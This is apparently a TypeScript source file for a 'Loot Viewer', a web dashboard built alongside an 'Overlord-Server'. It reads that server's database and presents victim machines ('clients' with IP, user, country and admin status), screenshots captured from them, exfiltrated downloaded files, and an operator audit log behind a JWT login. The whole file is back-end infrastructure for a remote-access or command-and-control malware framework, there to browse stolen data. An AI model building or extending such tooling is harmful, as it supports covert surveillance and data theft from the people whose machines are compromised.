import { Database } from "bun:sqlite";
import { jwtVerify } from "jose";
import { readFileSync, existsSync, readdirSync, statSync } from "fs";
import { join, resolve, basename } from "path";

// ── Config ──────────────────────────────────────────────────────────────────

const PORT = parseInt(process.env.LOOT_PORT || "5175");
const HOST = process.env.HOST || "0.0.0.0";
const DATA_DIR = (() => {
  const e = process.env.DATA_DIR;
  if (e && e.trim()) return e.trim();
  return "./data";
})();

const JWT_ISSUER = "overlord-server";
const JWT_AUDIENCE = "overlord-client";

function getJwtSecret(): Uint8Array {
  const fromEnv = process.env.JWT_SECRET;
  if (fromEnv && fromEnv.trim()) return new TextEncoder().encode(fromEnv.trim());
  const savePath = join(DATA_DIR, "save.json");
  if (existsSync(savePath)) {
    try {
      const saved = JSON.parse(readFileSync(savePath, "utf8"));
      const s = saved?.auth?.jwtSecret;
      if (s && s.trim()) return new TextEncoder().encode(s.trim());
    } catch {}
  }
  throw new Error("No JWT_SECRET found — set JWT_SECRET env or share DATA_DIR with Overlord-Server");
}

// ── Database (read-only) ─────────────────────────────────────────────────────

const DB_PATH = join(DATA_DIR, "overlord.db");
let db: Database;

function getDb(): Database {
  if (!db) {
    if (!existsSync(DB_PATH)) throw new Error(`DB not found: ${DB_PATH}`);
    db = new Database(DB_PATH, { readonly: true });
    db.run("PRAGMA journal_mode=WAL");
  }
  return db;
}

// ── Auth ─────────────────────────────────────────────────────────────────────

interface TokenPayload {
  sub: string;
  userId: number;
  role: string;
}

async function authenticate(req: Request): Promise<TokenPayload | null> {
  let token: string | null = null;

  const cookieHeader = req.headers.get("Cookie");
  if (cookieHeader) {
    for (const part of cookieHeader.split(/;\s*/)) {
      const [name, ...rest] = part.split("=");
      if (name === "overlord_token") { token = rest.join("="); break; }
    }
  }
  if (!token) {
    const auth = req.headers.get("Authorization");
    if (auth?.startsWith("Bearer ")) token = auth.slice(7);
  }
  if (!token) return null;

  try {
    const secret = getJwtSecret();
    const { payload } = await jwtVerify(token, secret, {
      issuer: JWT_ISSUER,
      audience: JWT_AUDIENCE,
    });
    return {
      sub: payload.sub as string,
      userId: payload["userId"] as number,
      role: payload["role"] as string,
    };
  } catch {
    return null;
  }
}

function unauthorized(): Response {
  return new Response(null, {
    status: 302,
    headers: { Location: "/login" },
  });
}

// ── API handlers ─────────────────────────────────────────────────────────────

function handleClients(): Response {
  const rows = getDb().query(`
    SELECT id, nickname, host, ip, os, arch, user, country, online, last_seen,
           is_admin, elevation, cpu, gpu, ram, enrollment_status, custom_tag
    FROM clients
    ORDER BY online DESC, last_seen DESC
    LIMIT 500
  `).all();
  return Response.json({ items: rows });
}

function handleScreenshots(url: URL): Response {
  const limit = Math.min(parseInt(url.searchParams.get("limit") || "50"), 200);
  const offset = parseInt(url.searchParams.get("offset") || "0");
  const rows = getDb().query(`
    SELECT id, notification_id, client_id, ts, format, width, height,
           length(bytes) as size_bytes
    FROM notification_screenshots
    ORDER BY ts DESC
    LIMIT ? OFFSET ?
  `).all(limit, offset);
  const total = (getDb().query("SELECT COUNT(*) as n FROM notification_screenshots").get() as any)?.n ?? 0;
  return Response.json({ items: rows, total });
}

function handleScreenshotImage(id: string): Response {
  const row = getDb().query(
    "SELECT bytes, format FROM notification_screenshots WHERE id = ?"
  ).get(id) as { bytes: Buffer; format: string } | null;

  if (!row) return new Response("Not found", { status: 404 });
  const mime = row.format === "jpeg" ? "image/jpeg" : "image/png";
  return new Response(row.bytes, { headers: { "Content-Type": mime } });
}

function handleDownloads(): Response {
  const dir = join(DATA_DIR, "downloads");
  if (!existsSync(dir)) return Response.json({ items: [] });
  const files = readdirSync(dir)
    .filter(f => !f.startsWith("."))
    .map(f => {
      const p = join(dir, f);
      try {
        const s = statSync(p);
        return { name: f, size: s.size, modified: s.mtimeMs };
      } catch {
        return { name: f, size: 0, modified: 0 };
      }
    })
    .sort((a, b) => b.modified - a.modified);
  return Response.json({ items: files });
}

function handleDownloadFile(filename: string): Response {
  // Prevent path traversal
  const safe = basename(filename);
  const filePath = resolve(join(DATA_DIR, "downloads", safe));
  if (!filePath.startsWith(resolve(join(DATA_DIR, "downloads")))) {
    return new Response("Forbidden", { status: 403 });
  }
  if (!existsSync(filePath)) return new Response("Not found", { status: 404 });
  return new Response(Bun.file(filePath));
}

function handleAudit(url: URL): Response {
  const limit = Math.min(parseInt(url.searchParams.get("limit") || "100"), 500);
  const offset = parseInt(url.searchParams.get("offset") || "0");
  const rows = getDb().query(`
    SELECT id, timestamp, username, ip, action, target_client_id, success, details, error_message
    FROM audit_logs
    ORDER BY timestamp DESC
    LIMIT ? OFFSET ?
  `).all(limit, offset);
  const total = (getDb().query("SELECT COUNT(*) as n FROM audit_logs").get() as any)?.n ?? 0;
  return Response.json({ items: rows, total });
}

// ── HTML pages ────────────────────────────────────────────────────────────────

const LOGIN_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Loot · Login</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0a0a0f;color:#e2e8f0;font-family:'Segoe UI',system-ui,sans-serif;
  min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{background:#111118;border:1px solid #1e1e2e;border-radius:12px;padding:2rem;width:360px}
h1{font-size:1.25rem;font-weight:600;margin-bottom:1.5rem;color:#a78bfa;text-align:center}
label{display:block;font-size:.8rem;color:#94a3b8;margin-bottom:.35rem}
input{width:100%;background:#0a0a0f;border:1px solid #2d2d3d;border-radius:6px;
  padding:.6rem .8rem;color:#e2e8f0;font-size:.9rem;outline:none;margin-bottom:1rem}
input:focus{border-color:#6d5ce7}
button{width:100%;background:#6d5ce7;border:none;border-radius:6px;padding:.65rem;
  color:#fff;font-size:.9rem;font-weight:600;cursor:pointer}
button:hover{background:#7c6af0}
.err{color:#f87171;font-size:.8rem;margin-top:.75rem;text-align:center;display:none}
</style>
</head>
<body>
<div class="card">
  <h1>☠ Loot Viewer</h1>
  <form id="f">
    <label>Username</label>
    <input type="text" id="u" autocomplete="username" required>
    <label>Password</label>
    <input type="password" id="p" autocomplete="current-password" required>
    <button type="submit">Sign in</button>
    <div class="err" id="err"></div>
  </form>
</div>
<script>
document.getElementById('f').onsubmit=async e=>{
  e.preventDefault();
  const err=document.getElementById('err');
  err.style.display='none';
  const res=await fetch('/api/login',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({username:document.getElementById('u').value,
                         password:document.getElementById('p').value})
  });
  if(res.ok){location.href='/'}
  else{const d=await res.json().catch(()=>({}));
    err.textContent=d.error||'Invalid credentials';err.style.display='block'}
};
</script>
</body>
</html>`;

const DASHBOARD_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Loot Viewer</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0a0a0f;color:#e2e8f0;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh}
header{background:#111118;border-bottom:1px solid #1e1e2e;padding:.75rem 1.5rem;
  display:flex;align-items:center;gap:1rem}
header h1{font-size:1rem;font-weight:700;color:#a78bfa;flex:1}
nav{display:flex;gap:.25rem}
nav button{background:none;border:1px solid #2d2d3d;border-radius:6px;padding:.4rem .9rem;
  color:#94a3b8;font-size:.8rem;cursor:pointer;transition:.15s}
nav button:hover,nav button.active{background:#6d5ce7;color:#fff;border-color:#6d5ce7}
.logout{background:none;border:1px solid #3d2d2d;border-radius:6px;padding:.4rem .9rem;
  color:#f87171;font-size:.8rem;cursor:pointer}
.logout:hover{background:#3d2d2d}
main{padding:1.5rem;max-width:1400px;margin:0 auto}
.panel{display:none}
.panel.active{display:block}
table{width:100%;border-collapse:collapse;font-size:.8rem}
th{text-align:left;padding:.6rem .75rem;color:#64748b;font-weight:500;
  border-bottom:1px solid #1e1e2e;white-space:nowrap}
td{padding:.55rem .75rem;border-bottom:1px solid #151520;max-width:260px;
  overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
tr:hover td{background:#111118}
.badge{display:inline-block;padding:.2rem .5rem;border-radius:4px;font-size:.7rem;font-weight:600}
.online{background:#0f2d1a;color:#4ade80}.offline{background:#1a1a2e;color:#64748b}
.approved{background:#1a2d1a;color:#4ade80}.pending{background:#2d2a0f;color:#fbbf24}
.denied{background:#2d0f0f;color:#f87171}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:.75rem}
.thumb{background:#111118;border:1px solid #1e1e2e;border-radius:8px;overflow:hidden;cursor:pointer}
.thumb img{width:100%;height:130px;object-fit:cover;display:block}
.thumb-info{padding:.5rem .6rem;font-size:.72rem;color:#64748b}
.thumb-info b{display:block;color:#cbd5e1;margin-bottom:.15rem}
.pager{display:flex;gap:.5rem;align-items:center;margin-top:1rem;font-size:.8rem;color:#64748b}
.pager button{background:#1a1a2e;border:1px solid #2d2d3d;border-radius:6px;
  padding:.3rem .7rem;color:#94a3b8;cursor:pointer;font-size:.8rem}
.pager button:hover{background:#2d2d3d}.pager button:disabled{opacity:.4;cursor:default}
.stats{display:flex;gap:1rem;margin-bottom:1.5rem;flex-wrap:wrap}
.stat{background:#111118;border:1px solid #1e1e2e;border-radius:8px;
  padding:.75rem 1.25rem;min-width:120px}
.stat-v{font-size:1.5rem;font-weight:700;color:#a78bfa}
.stat-l{font-size:.75rem;color:#64748b;margin-top:.1rem}
.dl-btn{background:#1a1a2e;border:1px solid #2d2d3d;border-radius:5px;padding:.3rem .6rem;
  color:#94a3b8;font-size:.75rem;text-decoration:none;cursor:pointer}
.dl-btn:hover{background:#6d5ce7;color:#fff;border-color:#6d5ce7}
#lightbox{display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);
  z-index:999;align-items:center;justify-content:center}
#lightbox.open{display:flex}
#lightbox img{max-width:90vw;max-height:90vh;border-radius:6px;border:1px solid #2d2d3d}
#lightbox .close{position:absolute;top:1rem;right:1.5rem;font-size:1.5rem;
  color:#fff;cursor:pointer;background:none;border:none}
</style>
</head>
<body>
<header>
  <h1>☠ Loot Viewer</h1>
  <nav>
    <button class="active" data-tab="clients">Clients</button>
    <button data-tab="screenshots">Screenshots</button>
    <button data-tab="downloads">Downloads</button>
    <button data-tab="audit">Audit Log</button>
  </nav>
  <button class="logout" id="logout">Sign out</button>
</header>

<main>
  <!-- Clients -->
  <div class="panel active" id="tab-clients">
    <div class="stats" id="client-stats"></div>
    <table>
      <thead><tr>
        <th>Status</th><th>Hostname</th><th>Nickname</th><th>User</th>
        <th>IP</th><th>OS</th><th>Country</th><th>CPU</th><th>RAM</th>
        <th>Admin</th><th>Enrollment</th><th>Last seen</th>
      </tr></thead>
      <tbody id="clients-body"></tbody>
    </table>
  </div>

  <!-- Screenshots -->
  <div class="panel" id="tab-screenshots">
    <div class="stats" id="ss-stats"></div>
    <div class="grid" id="ss-grid"></div>
    <div class="pager">
      <button id="ss-prev" disabled>← Prev</button>
      <span id="ss-page">Page 1</span>
      <button id="ss-next">Next →</button>
    </div>
  </div>

  <!-- Downloads -->
  <div class="panel" id="tab-downloads">
    <div class="stats" id="dl-stats"></div>
    <table>
      <thead><tr><th>Filename</th><th>Size</th><th>Modified</th><th></th></tr></thead>
      <tbody id="dl-body"></tbody>
    </table>
  </div>

  <!-- Audit -->
  <div class="panel" id="tab-audit">
    <div class="stats" id="audit-stats"></div>
    <table>
      <thead><tr>
        <th>Time</th><th>User</th><th>IP</th><th>Action</th>
        <th>Client</th><th>OK</th><th>Details</th>
      </tr></thead>
      <tbody id="audit-body"></tbody>
    </table>
    <div class="pager">
      <button id="audit-prev" disabled>← Prev</button>
      <span id="audit-page">Page 1</span>
      <button id="audit-next">Next →</button>
    </div>
  </div>
</main>

<div id="lightbox"><button class="close" id="lb-close">✕</button><img id="lb-img" src="" alt=""></div>

<script>
const tabs=document.querySelectorAll('nav button');
tabs.forEach(b=>b.addEventListener('click',()=>{
  tabs.forEach(x=>x.classList.remove('active'));
  b.classList.add('active');
  document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
  document.getElementById('tab-'+b.dataset.tab).classList.add('active');
  if(b.dataset.tab==='clients')loadClients();
  if(b.dataset.tab==='screenshots')loadScreenshots();
  if(b.dataset.tab==='downloads')loadDownloads();
  if(b.dataset.tab==='audit')loadAudit();
}));

document.getElementById('logout').onclick=async()=>{
  await fetch('/api/logout',{method:'POST'});location.href='/login';
};

// ── Clients ──────────────────────────────────────────────────────────────────
async function loadClients(){
  const r=await fetch('/api/clients');
  const {items}=await r.json();
  const tbody=document.getElementById('clients-body');
  const online=items.filter(c=>c.online).length;
  document.getElementById('client-stats').innerHTML=
    stat(items.length,'Total')+stat(online,'Online')+stat(items.length-online,'Offline');
  tbody.innerHTML=items.map(c=>\`<tr>
    <td><span class="badge \${c.online?'online':'offline'}">\${c.online?'●  ON':'○ OFF'}</span></td>
    <td>\${esc(c.host||'—')}</td>
    <td>\${esc(c.nickname||'')}</td>
    <td>\${esc(c.user||'—')}</td>
    <td>\${esc(c.ip||'—')}</td>
    <td>\${esc(c.os||'—')}</td>
    <td>\${esc(c.country||'—')}</td>
    <td>\${esc(c.cpu||'—')}</td>
    <td>\${esc(c.ram||'—')}</td>
    <td>\${c.is_admin?'<span class="badge online">YES</span>':'<span class="badge">no</span>'}</td>
    <td><span class="badge \${c.enrollment_status}">\${c.enrollment_status||'—'}</span></td>
    <td>\${c.last_seen?new Date(c.last_seen).toLocaleString():'—'}</td>
  </tr>\`).join('');
}

// ── Screenshots ───────────────────────────────────────────────────────────────
let ssOffset=0;const SS_LIMIT=24;
async function loadScreenshots(){
  const r=await fetch(\`/api/screenshots?limit=\${SS_LIMIT}&offset=\${ssOffset}\`);
  const {items,total}=await r.json();
  document.getElementById('ss-stats').innerHTML=stat(total,'Total screenshots');
  const grid=document.getElementById('ss-grid');
  grid.innerHTML=items.map(s=>\`
    <div class="thumb" onclick="openLightbox('/api/screenshots/\${s.id}/image')">
      <img src="/api/screenshots/\${s.id}/image" loading="lazy" alt="screenshot">
      <div class="thumb-info">
        <b>\${esc(s.client_id||'—')}</b>
        \${new Date(s.ts).toLocaleString()}<br>
        \${s.width}×\${s.height} · \${(s.size_bytes/1024).toFixed(0)}KB
      </div>
    </div>\`).join('');
  const page=Math.floor(ssOffset/SS_LIMIT)+1;
  document.getElementById('ss-page').textContent='Page '+page;
  document.getElementById('ss-prev').disabled=ssOffset===0;
  document.getElementById('ss-next').disabled=ssOffset+SS_LIMIT>=total;
}
document.getElementById('ss-prev').onclick=()=>{ssOffset=Math.max(0,ssOffset-SS_LIMIT);loadScreenshots()};
document.getElementById('ss-next').onclick=()=>{ssOffset+=SS_LIMIT;loadScreenshots()};

// ── Lightbox ──────────────────────────────────────────────────────────────────
function openLightbox(src){
  document.getElementById('lb-img').src=src;
  document.getElementById('lightbox').classList.add('open');
}
document.getElementById('lb-close').onclick=()=>document.getElementById('lightbox').classList.remove('open');
document.getElementById('lightbox').onclick=e=>{if(e.target===e.currentTarget)e.currentTarget.classList.remove('open')};

// ── Downloads ─────────────────────────────────────────────────────────────────
async function loadDownloads(){
  const r=await fetch('/api/downloads');
  const {items}=await r.json();
  document.getElementById('dl-stats').innerHTML=stat(items.length,'Files')+
    stat(fmtSize(items.reduce((a,f)=>a+f.size,0)),'Total size');
  document.getElementById('dl-body').innerHTML=items.map(f=>\`<tr>
    <td>\${esc(f.name)}</td>
    <td>\${fmtSize(f.size)}</td>
    <td>\${f.modified?new Date(f.modified).toLocaleString():'—'}</td>
    <td><a class="dl-btn" href="/api/downloads/file/\${encodeURIComponent(f.name)}" download="\${esc(f.name)}">↓ Save</a></td>
  </tr>\`).join('');
}

// ── Audit ─────────────────────────────────────────────────────────────────────
let auditOffset=0;const AUDIT_LIMIT=100;
async function loadAudit(){
  const r=await fetch(\`/api/audit?limit=\${AUDIT_LIMIT}&offset=\${auditOffset}\`);
  const {items,total}=await r.json();
  document.getElementById('audit-stats').innerHTML=stat(total,'Total entries');
  document.getElementById('audit-body').innerHTML=items.map(e=>\`<tr>
    <td>\${new Date(e.timestamp).toLocaleString()}</td>
    <td>\${esc(e.username||'—')}</td>
    <td>\${esc(e.ip||'—')}</td>
    <td>\${esc(e.action||'—')}</td>
    <td>\${esc(e.target_client_id||'—')}</td>
    <td>\${e.success?'✓':'✗'}</td>
    <td title="\${esc(e.details||'')}">
      \${esc((e.details||'').slice(0,60)+(e.details?.length>60?'…':''))}
    </td>
  </tr>\`).join('');
  const page=Math.floor(auditOffset/AUDIT_LIMIT)+1;
  document.getElementById('audit-page').textContent='Page '+page;
  document.getElementById('audit-prev').disabled=auditOffset===0;
  document.getElementById('audit-next').disabled=auditOffset+AUDIT_LIMIT>=total;
}
document.getElementById('audit-prev').onclick=()=>{auditOffset=Math.max(0,auditOffset-AUDIT_LIMIT);loadAudit()};
document.getElementById('audit-next').onclick=()=>{auditOffset+=AUDIT_LIMIT;loadAudit()};

// ── Helpers ───────────────────────────────────────────────────────────────────
function stat(v,l){return\`<div class="stat"><div class="stat-v">\${v}</div><div class="stat-l">\${l}</div></div>\`}
function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')}
function fmtSize(b){if(b<1024)return b+'B';if(b<1048576)return(b/1024).toFixed(1)+'KB';return(b/1048576).toFixed(1)+'MB'}

loadClients();
</script>
</body>
</html>`;

// ── Login via Overlord-Server (proxy) ─────────────────────────────────────────

const OVERLORD_URL = process.env.OVERLORD_URL || "http://localhost:5173";

async function handleLogin(req: Request): Promise<Response> {
  let body: any;
  try { body = await req.json(); } catch { return Response.json({ error: "Invalid JSON" }, { status: 400 }); }

  // Forward login to Overlord-Server and mirror its Set-Cookie
  const upstream = await fetch(`${OVERLORD_URL}/api/auth/login`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username: body.username, password: body.password }),
  });

  if (!upstream.ok) {
    const text = await upstream.text().catch(() => "");
    try { return Response.json(JSON.parse(text), { status: 401 }); } catch {
      return Response.json({ error: "Invalid credentials" }, { status: 401 });
    }
  }

  // Mirror the cookie back to client
  const cookies = upstream.headers.getSetCookie();
  const headers: Record<string, string | string[]> = {};
  if (cookies.length > 0) headers["Set-Cookie"] = cookies.length === 1 ? cookies[0] : cookies;
  return Response.json({ ok: true }, { headers });
}

// ── Server ────────────────────────────────────────────────────────────────────

const server = Bun.serve({
  port: PORT,
  hostname: HOST,
  async fetch(req) {
    const url = new URL(req.url);

    // Public routes
    if (url.pathname === "/login") return new Response(LOGIN_HTML, { headers: { "Content-Type": "text/html" } });
    if (url.pathname === "/health") return Response.json({ ok: true });

    // Auth-required routes
    if (url.pathname === "/api/login" && req.method === "POST") {
      return handleLogin(req);
    }

    if (url.pathname === "/api/logout" && req.method === "POST") {
      return new Response(null, {
        status: 302,
        headers: {
          Location: "/login",
          "Set-Cookie": "overlord_token=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0",
        },
      });
    }

    const user = await authenticate(req);
    if (!user) return unauthorized();

    if (url.pathname === "/" || url.pathname === "") {
      return new Response(DASHBOARD_HTML, { headers: { "Content-Type": "text/html" } });
    }

    if (url.pathname === "/api/clients" && req.method === "GET") return handleClients();
    if (url.pathname === "/api/screenshots" && req.method === "GET") return handleScreenshots(url);
    if (url.pathname === "/api/downloads" && req.method === "GET") return handleDownloads();
    if (url.pathname === "/api/audit" && req.method === "GET") return handleAudit(url);

    const ssMatch = url.pathname.match(/^\/api\/screenshots\/([^/]+)\/image$/);
    if (ssMatch && req.method === "GET") return handleScreenshotImage(ssMatch[1]);

    const dlMatch = url.pathname.match(/^\/api\/downloads\/file\/(.+)$/);
    if (dlMatch && req.method === "GET") return handleDownloadFile(decodeURIComponent(dlMatch[1]));

    return new Response("Not found", { status: 404 });
  },
  error(err) {
    console.error("[loot] Error:", err);
    return Response.json({ error: "Internal error" }, { status: 500 });
  },
});

console.log(`[loot] Listening on http://${HOST}:${PORT}`);
